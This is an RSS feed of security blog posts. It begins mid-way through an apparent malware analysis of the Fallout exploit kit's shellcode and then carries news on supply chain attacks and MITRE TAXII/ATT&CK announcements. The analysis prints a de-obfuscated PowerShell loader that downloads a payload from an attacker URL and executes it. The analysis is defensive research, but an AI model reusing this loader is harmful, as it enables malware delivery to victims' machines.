  <li>lpszAgent</li>
</ul>

<p><img alt="" src="https://4.bp.blogspot.com/-SHiC_-K52OE/XHoAYO0KSqI/AAAAAAAAaB4/mIuho6VGEigMXjQD0PYCic7yPSQjP50agCLcBGAs/s400/%25E3%2582%25B3%25E3%2583%25A1%25E3%2583%25B3%25E3%2583%2588%2B2019-03-02%2B095113.jpg" /></p>

<ul>
  <li>HTTP Method</li>
</ul>

<p><img alt="" src="https://1.bp.blogspot.com/-8VHYdHuFVzo/XHoAun-ulAI/AAAAAAAAaCE/dZL11EMf0Js8hKDBVtWrb1TpxiUKVleHgCLcBGAs/s400/%25E3%2582%25B3%25E3%2583%25A1%25E3%2583%25B3%25E3%2583%2588%2B2019-03-02%2B095212.jpg" /></p>

<ul>
  <li>Dll name</li>
</ul>

<p><img alt="" src="https://4.bp.blogspot.com/-d1VACU5EdCg/XHoA0UXjwJI/AAAAAAAAaCI/4nYEy6pr69YYZGCk-PYTL4DwLlXGXPEaACLcBGAs/s400/%25E3%2582%25B3%25E3%2583%25A1%25E3%2583%25B3%25E3%2583%2588%2B2019-03-02%2B095457.jpg" /></p>

<h3 id="execute">Execute</h3>
<p><img alt="" src="https://1.bp.blogspot.com/-J6-pH9sR77Y/XHoD9uuQ2rI/AAAAAAAAaCg/tdiUL-ppen0UgdBMlAw0YJoIAOp5JoJkgCLcBGAs/s400/%25E3%2582%25B3%25E3%2583%25A1%25E3%2583%25B3%25E3%2583%2588%2B2019-03-02%2B131719.jpg" /></p>

<h3 id="api-hash">API hash</h3>
<p>The API called by the shell code has been hashed by the dualaccModFFF1Hash algorithm.</p>

<p><img alt="" src="https://3.bp.blogspot.com/--PgKXNTSaEU/XHoC9ETsXsI/AAAAAAAAaCY/YfQrDoaJySA6qJpeQcsquCv6MRV5XyxwgCLcBGAs/s320/%25E3%2582%25B3%25E3%2583%25A1%25E3%2583%25B3%25E3%2583%2588%2B2019-03-02%2B131317.jpg" /></p>



<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ShellcodeHashSearcher: 0x00000686: dualaccModFFF1Hash:0x191c0443 kernel32.dll!CloseHandle
ShellcodeHashSearcher: 0x00000694: dualaccModFFF1Hash:0x28b90575 kernel32.dll!CreateProcessA
ShellcodeHashSearcher: 0x000006a6: dualaccModFFF1Hash:0x73320951 kernel32.dll!CreateToolhelp32Snapshot
ShellcodeHashSearcher: 0x000006b9: dualaccModFFF1Hash:0x33f50614 kernel32.dll!GetModuleHandleA
ShellcodeHashSearcher: 0x000006ca: dualaccModFFF1Hash:0x1d810497 kernel32.dll!LoadLibraryA
ShellcodeHashSearcher: 0x000006da: dualaccModFFF1Hash:0x2785054d kernel32.dll!Process32First
ShellcodeHashSearcher: 0x000006eb: dualaccModFFF1Hash:0x225904e4 kernel32.dll!Process32Next
ShellcodeHashSearcher: 0x000006fc: dualaccModFFF1Hash:0x1f7004d3 kernel32.dll!VirtualAlloc
ShellcodeHashSearcher: 0x0000070d: dualaccModFFF1Hash:0x1a1e047a kernel32.dll!ExitProcess
ShellcodeHashSearcher: 0x0000071e: dualaccModFFF1Hash:0x158503f3 kernel32.dll!ExitThread
ShellcodeHashSearcher: 0x00000737: dualaccModFFF1Hash:0x08d8028c msvcrt.dll!memset
ShellcodeHashSearcher: 0x00000737: dualaccModFFF1Hash:0x08d8028c ntoskrnl.exe!memset
ShellcodeHashSearcher: 0x00000737: dualaccModFFF1Hash:0x08d8028c ntdll.dll!memset
ShellcodeHashSearcher: 0x00000778: dualaccModFFF1Hash:0x3610065d wininet.dll!HttpOpenRequestA
ShellcodeHashSearcher: 0x00000787: dualaccModFFF1Hash:0x29fb0584 wininet.dll!HttpQueryInfoA
ShellcodeHashSearcher: 0x0000079a: dualaccModFFF1Hash:0x35c70655 wininet.dll!HttpSendRequestA
ShellcodeHashSearcher: 0x000007ab: dualaccModFFF1Hash:0x4b92078c wininet.dll!InternetCloseHandle
ShellcodeHashSearcher: 0x000007bc: dualaccModFFF1Hash:0x36640655 wininet.dll!InternetConnectA
ShellcodeHashSearcher: 0x000007cd: dualaccModFFF1Hash:0x245c051d wininet.dll!InternetOpenA
ShellcodeHashSearcher: 0x000007de: dualaccModFFF1Hash:0x35c00646 wininet.dll!InternetReadFile
ShellcodeHashSearcher: 0x00000685: dualaccModFFF1Hash:0x191c0443 kernel32.dll!CloseHandle
ShellcodeHashSearcher: 0x00000693: dualaccModFFF1Hash:0x28b90575 kernel32.dll!CreateProcessA
ShellcodeHashSearcher: 0x000006a5: dualaccModFFF1Hash:0x73320951 kernel32.dll!CreateToolhelp32Snapshot
ShellcodeHashSearcher: 0x000006b8: dualaccModFFF1Hash:0x33f50614 kernel32.dll!GetModuleHandleA
ShellcodeHashSearcher: 0x000006c9: dualaccModFFF1Hash:0x1d810497 kernel32.dll!LoadLibraryA
ShellcodeHashSearcher: 0x000006d9: dualaccModFFF1Hash:0x2785054d kernel32.dll!Process32First
ShellcodeHashSearcher: 0x000006ea: dualaccModFFF1Hash:0x225904e4 kernel32.dll!Process32Next
ShellcodeHashSearcher: 0x000006fb: dualaccModFFF1Hash:0x1f7004d3 kernel32.dll!VirtualAlloc
ShellcodeHashSearcher: 0x0000070c: dualaccModFFF1Hash:0x1a1e047a kernel32.dll!ExitProcess
ShellcodeHashSearcher: 0x0000071d: dualaccModFFF1Hash:0x158503f3 kernel32.dll!ExitThread
ShellcodeHashSearcher: 0x00000736: dualaccModFFF1Hash:0x08d8028c msvcrt.dll!memset
ShellcodeHashSearcher: 0x00000736: dualaccModFFF1Hash:0x08d8028c ntoskrnl.exe!memset
ShellcodeHashSearcher: 0x00000736: dualaccModFFF1Hash:0x08d8028c ntdll.dll!memset
ShellcodeHashSearcher: 0x00000777: dualaccModFFF1Hash:0x3610065d wininet.dll!HttpOpenRequestA
ShellcodeHashSearcher: 0x00000786: dualaccModFFF1Hash:0x29fb0584 wininet.dll!HttpQueryInfoA
ShellcodeHashSearcher: 0x00000799: dualaccModFFF1Hash:0x35c70655 wininet.dll!HttpSendRequestA
ShellcodeHashSearcher: 0x000007aa: dualaccModFFF1Hash:0x4b92078c wininet.dll!InternetCloseHandle
ShellcodeHashSearcher: 0x000007bb: dualaccModFFF1Hash:0x36640655 wininet.dll!InternetConnectA
ShellcodeHashSearcher: 0x000007cc: dualaccModFFF1Hash:0x245c051d wininet.dll!InternetOpenA
ShellcodeHashSearcher: 0x000007dd: dualaccModFFF1Hash:0x35c00646 wininet.dll!InternetReadFile
</code></pre></div></div>

<p>The final encoded PowerShell script is downloaded, decoded and executed.</p>

<h2 id="powershell">PowerShell</h2>

<pre><code class="language-ps1">Add-Type -TypeDefinition @"
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

[StructLayout(LayoutKind.Sequential)]
public struct lI111
{
    public IntPtr llIll;
    public IntPtr II1ll1I1;
    public uint llllIlI;
    public uint l1l1l;
}

[StructLayout(LayoutKind.Sequential,CharSet=CharSet.Unicode)]
public struct lI1I1l1l
{
    public uint lI1lI1I;
    public string l1l1II1;
    public string llIlI1;
    public string IlIl1l;
    public uint ll1llI11;
    public uint ll1l11I1;
    public uint IlI11lI;
    public uint IIlIll1I;
    public uint IIl1II;
    public uint I11Il;
    public uint IIIIII;
    public uint l1IlIll;
    public short llI11l1;
    public short llll1I11;
    public IntPtr I1llIIlI;
    public IntPtr Il1I11lI;
    public IntPtr llllll;
    public IntPtr lI1l1I1I;
};

public static class I1l11lIl
{
    [DllImport(""kernel32.dll"",SetLastError=true)]
    public static extern bool CreateProcess(string I1l1Il1I,string l1111,IntPtr lllI111,IntPtr I111IIlI,bool lllll,uint III1l1l1,IntPtr l1l1l11l,string lIll1111,ref lI1I1l1l l111l,out lI111 I1111l1);
}
"@;

$lIlI1 = "$env:userprofile\AppData\LocalLow\$(-join((48..57)+(65..90)+(97..122)|Get-Random -Count 8|%{[char]$_})).tmp";
$Il11l = 'https://not-my-guilty.com/04_10_1971/beaveries/aoer.phtml';

$cli = (New-Object Net.WebClient);
$cli.Headers['User-Agent'] = 'pqqyW56Fe8W2G7m3';
$cli.DownloadFile($Il11l, $lIlI1);

$llII11l = New-Object lI1I1l1l;
$llII11l.llI11l1 = 0x0;
$llII11l.lI1lI1I = [System.Runtime.InteropServices.Marshal]::SizeOf($llII11l);
$I1111111 = New-Object lI111;
[I1l11lIl]::CreateProcess($lIlI1, $lIlI1, [IntPtr]::Zero, [IntPtr]::Zero, $false, 0x00000008, [IntPtr]::Zero, "c:", [ref]$llII11l, [ref]$I1111111)|out-null;
</code></pre>

<p>This PowerShell code downloads the malware and calls CreateProcess. At this time, User-Agent is not common.</p>

<p><img alt="" src="https://nao-sec.org/assets/2019-03-07/02.png" /></p>

<h2 id="finally">Finally</h2>
<p>Fallout has also evolved. Analysis has become more difficult than before. You should keep an eye on Fallout in the future.</p>
]]></content:encoded>
<pubDate>2019-03-06T15:00:00+00:00</pubDate>
</item>
<item>
<title>Cyble Research Reveals Near-Daily Surge in Supply Chain Attacks</title>
<link>https://www.cysecurity.news/2024/08/cyble-research-reveals-near-daily-surge.html</link>
<guid>https://www.cysecurity.news/2024/08/cyble-research-reveals-near-daily-surge.html</guid>
<content:encoded><![CDATA[
<p>&nbsp;</p>
<div class="separator" style="clear: both;"><a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhj_ZBIQzOAPBvGALxcLtEBgh3aMfk-heWaV3T_mIMI29LLFFy8JHnS5pB2HLMaeL10rHz92dEjpXJF_7Il41mVxXZgKwEsf_vDAQwGOdGmyfEXTWcWg0SJaZylM7GS2LxWNXCGlPs_8YzHZ3-bk3CajI3uJmWMJ_MoIHgPX2owMuGt1nlQPWjO7_g7LjY/s4576/pexels-pixabay-60504.jpg" style="display: block; padding: 1em 0px; text-align: center;"><img alt="" border="0" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhj_ZBIQzOAPBvGALxcLtEBgh3aMfk-heWaV3T_mIMI29LLFFy8JHnS5pB2HLMaeL10rHz92dEjpXJF_7Il41mVxXZgKwEsf_vDAQwGOdGmyfEXTWcWg0SJaZylM7GS2LxWNXCGlPs_8YzHZ3-bk3CajI3uJmWMJ_MoIHgPX2owMuGt1nlQPWjO7_g7LjY/s600/pexels-pixabay-60504.jpg" width="600" /></a></div><div style="text-align: justify;">The prevalence of software supply chain attacks is on the rise, posing significant threats due to the extensive impact and severity of such incidents, according to threat intelligence researchers at Cyble.</div><div style="text-align: justify;"><br /></div><div style="text-align: justify;">Within a six-month span from February to mid-August, Cyble identified 90 claims of supply chain breaches made by cybercriminals on the dark web. This averages nearly one breach every other day. Supply chain attacks are notably more costly and damaging than other types of cyber breaches, making even a small number of these attacks particularly detrimental.</div><div style="text-align: justify;"><br /></div><div style="text-align: justify;">Cyble’s blog highlights that while infiltrations of an IT supplier’s codebase—similar to the SolarWinds incident in 2020 and Kaseya in 2021—are relatively uncommon, the software supply chain’s various components, including code, dependencies, and applications, remain a continuous source of vulnerabilities. These persistent risks leave all organizations exposed to potential cyberattacks.</div><div style="text-align: justify;"><br /></div><div style="text-align: justify;">Even when supply chain breaches do not compromise codebases, they can still result in the exposure of sensitive data, which attackers can exploit to breach other environments through methods such as phishing, spoofing, and credential theft. The interconnected nature of the physical and digital supply chain means that any manufacturer or supplier involved in downstream distribution could be considered a potential cyber risk, according to the researchers.</div><div style="text-align: justify;"><br /></div><div style="text-align: justify;">In their 2024 analysis, Cyble researchers examined the frequency and characteristics of supply chain attacks and explored defenses that can mitigate these risks.</div><div style="text-align: justify;"><br /></div><div style="text-align: justify;"><b>Increasing Frequency of Supply Chain Attacks</b></div><div style="text-align: justify;"><br /></div><div style="text-align: justify;">Cyble’s dark web monitoring revealed 90 instances of cybercriminals claiming successful supply chain breaches between February and mid-August 2024.</div><div style="text-align: justify;"><br /></div><div style="text-align: justify;">IT service providers were the primary targets, accounting for one-third of these breaches. Technology product companies were also significantly impacted, experiencing 14 breaches. The aerospace and defense, manufacturing, and healthcare sectors followed, each reporting between eight and nine breaches.</div><div style="text-align: justify;"><br /></div><div style="text-align: justify;">Despite the concentration of attacks in certain industries, Cyble’s data shows that 22 out of 25 sectors tracked have experienced supply chain attacks in 2024. The U.S. led in the number of breaches claimed on the dark web, with 31 incidents, followed by the UK with 10, and Germany and Australia with five each. Japan and India each reported four breaches.</div><div style="text-align: justify;"><br /></div><div style="text-align: justify;"><b>Significant Supply Chain Attacks in 2024</b></div><div style="text-align: justify;"><br /></div><div style="text-align: justify;">Cyble’s blog detailed eight notable attacks, ranging from codebase hijacks affecting over 100,000 sites to disruptions of essential services. Examples include:</div><div style="text-align: justify;"><br /></div><div style="text-align: justify;"><ul><li>jQuery Attack: In July, a supply chain attack targeted the JavaScript npm package manager, using trojanized versions of jQuery to exfiltrate sensitive form data from websites. This attack impacted multiple platforms and highlighted the urgent need for developers and website owners to verify package authenticity and monitor code for suspicious modifications.</li><li>Polyfill Attack: In late June, a fake domain impersonated the Polyfill.js library, injecting malware into over 100,000 websites. This malware redirected users to unauthorized sites, underscoring the security risks associated with external code libraries and the importance of vigilant website security.</li><li>Programming Language Breach: The threat actor IntelBroker claimed unauthorized access to a node package manager (npm) and GitHub account related to an undisclosed programming language, including private repositories with privileges to push and clone commits.</li><li>CDK Global Inc. Attack: On June 19, a ransomware attack targeted CDK Global Inc., a provider of software to automotive dealerships, disrupting sales and inventory operations for weeks across North American auto dealers, including major networks like Group1 Automotive Inc. and AutoNation Inc.</li><li>Access to 400+ Companies: IntelBroker also claimed in June to have access to over 400 companies through a compromised third-party contractor, with data access to platforms like Jira, GitHub, and AWS, potentially affecting large organizations such as Lockheed Martin and Samsung.</li></ul></div><div style="text-align: justify;"><b>Mitigating Supply Chain Risks through Zero Trust and Resilience</b></div><div style="text-align: justify;"><br /></div><div style="text-align: justify;">To counter supply chain attacks, Cyble researchers recommend adopting zero trust principles, enhancing cyber resilience, and improving code security. Key defenses include:</div><div style="text-align: justify;"><br /></div><div style="text-align: justify;"><ol><li>Network microsegmentation</li><li>Strong access controls</li><li>Robust user and device identity authentication</li><li>Encrypting data both at rest and in transit</li><li>Ransomware-resistant backups that are “immutable, air-gapped, and isolated”</li><li>Honeypots for early detection of breaches</li><li>Secure configuration of API and cloud service connections</li><li>Monitoring for unusual activity using tools like SIEM and DLP</li><li>Regular audits, vulnerability scanning, and penetration testing are also essential for maintaining these controls.</li></ol></div><div style="text-align: justify;"><br /></div><div style="text-align: justify;"><b>Enhancing Secure Development and Third-Party Risk Management</b></div><div style="text-align: justify;"><br /></div><div style="text-align: justify;">Cyble also emphasizes best practices for code security, including developer audits and partner assessments. The use of threat intelligence services like Cyble’s can further aid in evaluating partner and vendor risks.</div><div style="text-align: justify;"><br /></div><div style="text-align: justify;">Cyble’s third-party risk intelligence module assesses partner security across various areas, such as cyber hygiene, dark web exposure, and network vulnerabilities, providing specific recommendations for improvement. Their AI-powered vulnerability scanning also helps organizations identify and prioritize their own web-facing vulnerabilities.</div><div style="text-align: justify;"><br /></div><div style="text-align: justify;">As security becomes a more critical factor in purchasing decisions, vendors will likely need to improve their security controls and documentation to meet these demands, the report concludes.</div>
]]></content:encoded>
<pubDate>2024-08-24T13:22:39.668-04:00</pubDate>
</item>
<item>
<title>Introducing TAXII 2.1 and a fond farewell to the TAXII 2.0 Server</title>
<link>https://medium.com/mitre-attack/introducing-taxii-2-1-and-a-fond-farewell-to-taxii-2-0-d9fca6ce4c58?source=rss----6da19bd08fba---4</link>
<guid>https://medium.com/mitre-attack/introducing-taxii-2-1-and-a-fond-farewell-to-taxii-2-0-d9fca6ce4c58?source=rss----6da19bd08fba---4</guid>
<content:encoded><![CDATA[
<figure><img alt="" src="https://cdn-images-1.medium.com/max/1024/1*0GQBfYbb0frVtyhYLi3yiA.png" /></figure><p>As mentioned in our <a href="/mitre-attack/attack-2024-roadmap-8dfc46d1ad1b">2024 Roadmap</a> and the <a href="/mitre-attack/attack-v15-26685f300acc">v15 release blog</a>, we’re excited to introduce our new TAXII server and the latest addition to the ATT&amp;CK Workbench software suite: the <a href="https://attack-taxii.mitre.org/">MITRE ATT&amp;CK Workbench TAXII 2.1 Server</a>. We’ve open-sourced the TAXII 2.1 code on <a href="https://github.com/mitre-attack/attack-workbench-taxii-server">GitHub</a>, allowing you to set up your own servers within your organization <em>and </em>contribute to its improvement.</p><p>While you’re diving into the new 2.1 server, don’t forget: our TAXII 2.0 server is retiring on <strong>December 18.</strong></p><p><strong>To continue receiving updated ATT&amp;CK data, you’ll need to migrate from cti-taxii.mitre.org to attack-taxii.mitre.org. However, this migration may involve more than just a URL change. Given the transition from STIX 2.0 to STIX 2.1, the complexity of your migration will depend on how deeply your applications are integrated with STIX 2.0. We recommend assessing the impact on your systems and planning your migration accordingly.</strong></p><p><strong>Getting Started with TAXII 2.1</strong></p><p>Ready to explore the MITRE ATT&amp;CK Workbench TAXII 2.1 server?</p><ul><li>Visit our <a href="https://github.com/mitre-attack/attack-workbench-taxii-server">GitHub repository</a> for the source code and detailed <a href="https://github.com/mitre-attack/attack-workbench-taxii-server/blob/main/docs/USAGE.md">usage documentation</a>.</li><li>Leverage the <a href="https://github.com/mitre-attack/attack-workbench-deployment">ATT&amp;CK Workbench Deployment</a> repository with <a href="https://github.com/mitre-attack/attack-workbench-deployment/blob/main/compose.yaml">Docker Compose templates</a> to simplify setting up Workbench services and the TAXII 2.1 module (so you can pull the Docker images from GitHub and get started without building from source!).</li><li>Skip the source code and pull the TAXII 2.1 Docker image directly from the <a href="https://github.com/mitre-attack/attack-workbench-taxii-server/pkgs/container/attack-workbench-taxii-server">GitHub Container Registry</a>.</li><li>Access the server <a href="https://attack-taxii.mitre.org/api-docs/">Swagger interface</a> and <a href="https://www.usebruno.com/">Bruno API Client</a> definitions (Bruno, similar to Postman, provides an easy way to interact with REST APIs). You can find our <a href="https://github.com/mitre-attack/attack-workbench-taxii-server/tree/main/bruno">Bruno files here</a>.</li><li>Familiarize yourself with the <a href="https://docs.oasis-open.org/cti/taxii/v2.1/os/taxii-v2.1-os.html#_Toc31107514">OASIS TAXII 2.1 specification</a> to enhance your integration prowess.</li><li>Experience issues? Submit <a href="https://github.com/mitre-attack/attack-workbench-taxii-server/issues/new/choose">specific requests or encounter issues</a> on GitHub.</li></ul><p><strong>Why TAXII 2.1?</strong></p><p>We know the ATT&amp;CK community has relied on our public TAXII 2.0 server, but it had issues like frequent outages. The TAXII 2.1 server addresses these problems with a more reliable and smooth experience. It’s built for scalability and stress-tested with real-world benchmarks from TAXII 2.0, ensuring you’re less likely to face major outages. Additionally, the new server introduces pagination, which was missing in TAXII 2.0. This means you can fetch smaller chunks of data instead of the entire ~20 MB STIX collection, speeding up the process and reducing data transfer costs.</p><p>A critical update to note is that our TAXII 2.1 server will exclusively host STIX 2.1 content moving forward. This change is part of our long-term strategy to shift away from STIX 2.0, aligning with the latest standards.</p><p>The new TAXII 2.1 server is also more powerful and capable than the previous version. We designed it to smoothly integrate with Workbench, making CTI management as seamless as possible. If you’re already using the ATT&amp;CK Workbench in your CTI workflows, you can easily edit and maintain CTI data without needing additional tools. The TAXII 2.1 server integrates with the ATT&amp;CK Workbench software suite, and can automatically synch with the Workbench REST API (the Workbench “back end”).</p><p>Workbench users can add objects, STIX collections, and bundles, and the TAXII 2.1 server will automatically make them available via its REST API. You don’t need to change your editor workflows — just bring the TAXII 2.1 server online in your Workbench container stack, and it will sync every 30 minutes by default (administrators can adjust this if needed). TAXII 2.1 is also optional, and you can continue using Workbench as usual without it.</p><p>Of note, the TAXII 2.1 specification outlines two “sharing models” for TAXII server implementations:</p><ul><li>The <strong>Collection model</strong>, where the TAXII server allows producers to host a set of CTI data that can be requested by consumers: TAXII Clients and Servers exchange information in a <a href="https://en.wikipedia.org/wiki/Request%E2%80%93response">request-response model</a>.</li><li>The <strong>Channel model</strong>, where the TAXII server uses the <a href="https://en.wikipedia.org/wiki/Publish%E2%80%93subscribe_pattern">publish-subscribe pattern</a> to allow producers to push data to many consumers and consumers to receive data from many producers.</li></ul><p>Given that Channels are still loosely defined in the TAXII specification, we decided to only implement the Collections model outlined in the TAXII 2.1 specification. However, we are open to adding support for a pub-sub model in future releases.</p><p><strong>A Brief Guide to Accessing Threat Intelligence Data</strong></p><p>With the new TAXII 2.1 server, you can still access your cyber threat intel in STIX format through the publicly accessible REST API, just like its <a href="http://cti-taxii.mitre.org/">predecessor</a> (cti-taxii.mitre.org) that’s been around for <a href="https://medium.com/mitre-attack/att-ck-content-available-in-stix-2-0-via-public-taxii-2-0-server-317e5c41e214">over 6 years</a>. Even though this server has some sophisticated functionality, querying it is actually pretty simple. This following guide will show you the basics and help you easily get the threat intelligence data you need.</p><p>With TAXII 2.1 running on a RESTful API model and using standard HTTP requests, you can connect to the server using any HTTP client you like. This includes popular tools like curl, wget, httpie, or Postman. This flexibility allows you to seamlessly integrate TAXII 2.1 queries into your existing workflows and tools.</p><p>Let’s dive into how to structure these requests and interpret the responses.</p><p>Importantly, all TAXII 2.1 requests require a special Accept header:</p><pre>GET /taxii2/ HTTP/1.1 Accept: application/taxii+json;version=2.1 Host: attack-taxii.mitre.org</pre><p>Here is an example of setting the Accept header using the curl tool:</p><pre>curl --request GET \<br />  --url https://attack-taxii.mitre.org/taxii2/ \<br />  --header ‘Accept: application/taxii+json;version=2.1’</pre><p>The request above sends a request to the TAXII server’s <a href="https://docs.oasis-open.org/cti/taxii/v2.1/os/taxii-v2.1-os.html#_Toc31107497">Discovery endpoint</a>, which returns a list of available API roots that the TAXII server offers. Each API Root is the “root” URL of that particular instance of the TAXII API. Our TAXII server only hosts one API Root, which we can see clearly from the response body:</p><pre>{ <br />  &quot;title&quot;: &quot;MITRE ATT&amp;CK TAXII 2.1&quot;, <br />  &quot;description&quot;: &quot;This API Root contains TAXII 2.1 REST API endpoints that serve MITRE ATT&amp;CK STIX 2.1 data&quot;, <br />  &quot;default&quot;: &quot;api/v21&quot;, <br />  &quot;api_roots&quot;: [ <br />    &quot;api/v21&quot; <br />  ] <br />} </pre><p>Great! Now that we have the API Root, let’s see if we can query for a list of available <a href="https://docs.oasis-open.org/cti/taxii/v2.1/os/taxii-v2.1-os.html#_Toc31107500">TAXII Collections</a>:</p><pre>curl --request GET \  <br />    --url https://attack-taxii.mitre.org/api/v21/collections/ \  <br />    --header 'Accept: application/taxii+json;version=2.1' </pre><p>The response should look something like the following:</p><pre>{<br />  “collections”: [<br />    {<br />      “id”: “x-mitre-collection — 1f5f1533-f617–4ca8–9ab4–6a02367fa019”,<br />      “title”: “Enterprise ATT&amp;CK”,<br />      “description”: “ATT&amp;CK for Enterprise provides a knowledge base of real-world adversary behavior targeting traditional enterprise networks. ATT&amp;CK for Enterprise covers the following platforms: Windows, macOS, Linux, PRE, Office 365, Google Workspace, IaaS, Network, and Containers.”,<br />      “canRead”: true,<br />      “canWrite”: false,<br />      “mediaTypes”: [<br />        “application/taxii+json;version=2.1”,<br />        “application/taxii+json”<br />      ]<br />    },<br />    {<br />      id”: “x-mitre-collection — 90c00720–636b-4485-b342–8751d232bf09”,<br />      “title”: “ICS ATT&amp;CK”,<br />      …<br />    },<br />    {<br />      “id”: “x-mitre-collection — dac0d2d7–8653–445c-9bff-82f934c1e858”,<br />      “title”: “Mobile ATT&amp;CK”,<br />      …<br />    }<br />  ]<br />}</pre><p>The response lists three objects that match the main ATT&amp;CK domains: Enterprise, Mobile, and ICS. Of note, <em>TAXII Collections</em> and <em>STIX Collections</em> are different concepts — with TAXII Collections operating as versatile containers for CTI objects. For our MITRE ATT&amp;CK TAXII server, we’ve mapped each TAXII Collection directly to an ATT&amp;CK domain. This means querying a TAXII Collection from our server provides data from just one domain, simplifying the user experience and aligning with the ATT&amp;CK framework. While this mapping isn’t required by the TAXII protocol and other servers may organize collections differently, we chose this method to make our server more intuitive for the ATT&amp;CK community.</p><p>Now that we have our API Root and the available TAXII Collections, we’re ready to <a href="https://docs.oasis-open.org/cti/taxii/v2.1/os/taxii-v2.1-os.html#_Toc31107539">retrieve some CTI objects</a>:</p><pre>curl --request GET \<br />  --url 'https://attack-taxii.mitre.org/api/v21/collections/x-mitre-collection--dac0d2d7-8653-445c-9bff-82f934c1e858/objects?limit=100' \<br />  --header ‘Accept: application/taxii+json;version=2.1’</pre><p>This request sends a request for the first 100 objects from the Enterprise ATT&amp;CK collection. The response should look something like this:</p><pre>{<br />  “more”: true,<br />  “next”: “1”,<br />  “objects”: [←100 →]<br />}</pre><p>If the ‘more’ property is set to true and the ‘next’ property is populated, then the client can paginate through the remaining records using the ‘next’ URL parameter along with the same original query options. So, we can request the second page of 100 objects by simply adding the ‘next=1’ query parameter to the original request:</p><pre>curl --request GET \  <br />    --url 'https://attack-taxii.mitre.org/api/v21/collections/x-mitre-collection--dac0d2d7-8653-445c-9bff-82f934c1e858/objects?limit=100&amp;next=1' \  <br />    --header 'Accept: application/taxii+json;version=2.1' </pre><p><strong>What’s Next for ATT&amp;CK Workbench TAXII 2.1</strong></p><p>We believe the release of the MITRE ATT&amp;CK Workbench TAXII 2.1 server is a big step forward for threat intelligence sharing — and we have even more exciting integrations on our roadmap to make the TAXII experience even smoother:</p><ul><li>Workbench UI indicators that signal whether an object or collection is actively being shared through TAXII;</li><li>Workbench UI toggles that allow users to pause (or enable) the sharing objects and collections with TAXII;</li><li>Workbench role-based access controls (RBAC) for TAXII administration.</li></ul><p>Stay tuned for more updates and enhancements as we continue to evolve our tools!</p><p>©2024 The MITRE Corporation. ALL RIGHTS RESERVED. Approved for public release. Distribution unlimited 24–00195–2.</p><img alt="" height="1" src="https://medium.com/_/stat?event=post.clientViewed&amp;referrerSource=full_rss&amp;postId=d9fca6ce4c58" width="1" /><hr /><p><a href="https://medium.com/mitre-attack/introducing-taxii-2-1-and-a-fond-farewell-to-taxii-2-0-d9fca6ce4c58">Introducing TAXII 2.1 and a fond farewell to the TAXII 2.0 Server</a> was originally published in <a href="https://medium.com/mitre-attack">MITRE ATT&amp;CK®</a> on Medium, where people are continuing the conversation by highlighting and responding to this story.</p>
]]></content:encoded>
<pubDate>2024-08-22T16:33:32.771Z</pubDate>
</item>
<item>
<title>ATT&amp;CK v15 Brings the Action</title>
<link>https://medium.com/mitre-attack/attack-v15-26685f300acc?source=rss----6da19bd08fba---4</link>
<guid>https://medium.com/mitre-attack/attack-v15-26685f300acc?source=rss----6da19bd08fba---4</guid>
<content:encoded><![CDATA[
<h3>ATT&amp;CK v15 Brings the Action: Upgraded Detections, New Analytic Format, &amp; Cross-Domain Adversary Insights</h3><figure><img alt="" src="https://cdn-images-1.medium.com/max/1024/1*9nefc6VVPUZWdnO9pxLoTA.png" /></figure><p>v15 is all about actionability and bringing defenders’ reality into focus — we prioritized <em>what </em>you need to detect, and <em>how </em>you can do it more effectively with detection engineering upgrades, and deeper intelligence insights across platforms. This release also reflects the new expansion rhythm, balancing both well-known and emerging behaviors to reflect how trends and activity are experienced in the field.</p><p>For the details on our updates/additions across Techniques, Software, Groups and Campaigns take a look at our <a href="https://attack.mitre.org/resources/updates/updates-april-2024/index.html">release notes</a>, our <a href="https://attack.mitre.org/docs/changelogs/v14.1-v15.0/changelog-detailed.html">detailed changelog</a>, or our <a href="https://attack.mitre.org/docs/changelogs/v14.1-v15.0/changelog.json">changelog.json</a>.</p><h3><strong>Enterprise | Familiar + Novel = Reality</strong></h3><p>With v15 we were aiming for the perfect balance of familiar behaviors you’ve probably seen countless times (e.g., <a href="https://attack.mitre.org/techniques/T1027/013/">T1027.013: Obfuscated Files or Information: Encrypted/ Encoded File</a>, <a href="https://attack.mitre.org/techniques/T1665/">T1665: Hide Infrastructure</a>), as well as newer, emerging trends. The shadowy domain of Resource Development was expanded to illuminate how adversaries are using generative artificial intelligence tools, like large language models (LLMs), to support various malicious activities (<a href="https://attack.mitre.org/techniques/T1588/007/">T1588.007: Obtain Capabilities: Artificial Intelligence</a>). And it’s not just about gaining initial access anymore — we added <a href="https://attack.mitre.org/techniques/T1584/008/">T1584.008: Compromise Infrastructure: Network Devices</a> to capture how threat groups are hacking into third-party network devices, including small office/home office routers, to use these devices to facilitate further targeting.</p><h3><strong>Cloud | More Actionability</strong></h3><p>As outlined in the <a href="/mitre-attack/attack-2024-roadmap-8dfc46d1ad1b">ATT&amp;CK 2024 Roadmap</a>, we’re striving to make the <a href="https://attack.mitre.org/matrices/enterprise/cloud/">Cloud matrix</a> more approachable for defenders of all skill levels. With this release, we focused on providing a broader set of defensive measures, resources, and insights for CI/CD pipelines, Infrastructure as Code (IaC), and Identity. v15 features new mitigations and data sources on token protection, along with more specific references to Okta logs. <a href="https://attack.mitre.org/techniques/T1072/">T1072: Software Deployment Tools</a> was expanded to include broad execution of <a href="https://attack.mitre.org/techniques/T1651/">T1651: Cloud Administration Command</a>, reflecting how threat actors are turning cloud native tools like AWS Systems Manager into remote access trojans.</p><p>We ramped up resources for CI/CD pipelines and IaC, and made some refinements to Identity, with the expansion of <a href="https://attack.mitre.org/techniques/T1484/002/">T1484: Domain Policy Modification</a> to include not just Azure AD, but also other identity-as-a-service providers like Okta. <a href="https://attack.mitre.org/techniques/T1556/">T1556: Modify Authentication Process</a> gained a new sub (<a href="https://attack.mitre.org/techniques/T1556/009/">T1556.009: Conditional Access Policies</a>) exploring how threat actors have tampered with or disabled conditional access policies for ongoing access to compromised accounts. We also expanded <a href="https://attack.mitre.org/techniques/T1136/003/">T1136.003: Create Account: Cloud Account</a> with additional service account insights.</p><p><strong>What’s Next:</strong> v16 will feature robust identity and detection updates, as well as the platform rebalancing operations, where we’re focusing on covering a wider range of cloud environments and threats, while making it more intuitive to prioritize techniques relevant to a specific platform.</p><h3><strong>Defensive Coverage | Upgrading, Converting &amp; Restructuring Defensive 